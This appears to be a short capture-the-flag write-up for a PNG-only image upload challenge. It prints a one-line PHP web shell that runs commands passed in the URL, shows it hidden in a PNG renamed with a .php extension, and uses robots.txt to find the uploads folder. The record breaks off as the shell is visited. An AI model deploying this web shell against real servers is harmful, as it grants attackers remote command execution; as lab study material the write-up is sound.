Description
I found a web app that can help process images: PNG images only!

# Solution #
Based on the description, I knew that it would be a file upload vulnerability, png file to be specific.

My payload:
```php
<?php system($_GET['cmd']); ?>
```
I inject it to a png file named blue.png I downloaded online and renamed it to [blue.png.php](blue.png.php)

Upload result:

![img](1.png)

However, I did't know where was the file stored, so I tried visiting robots.txt for more information.

robots.txt:
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
So the file was likely stored in /uploads/blue.png.php.

/uploads/blue.png.php
```
